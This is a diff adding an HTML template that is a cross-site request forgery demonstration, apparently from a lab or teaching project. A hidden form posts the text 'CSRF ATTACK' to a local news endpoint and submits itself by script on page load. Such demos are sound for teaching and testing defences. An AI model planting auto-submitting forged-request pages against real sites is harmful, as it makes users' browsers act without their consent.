@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
+    <head lang="en">
+        <meta charset="UTF-8" />
+        <title>A template</title>
+    </head>
+    <body>
+        
+        <form name="csrf_form" action="http://localhost:8080/news" method="POST">
+            <input type="hidden" name="content" value="CSRF ATTACK" />
+        </form>
+
+        <script type="text/javascript">document.csrf_form.submit();</script>
+        
+    </body>
+</html>
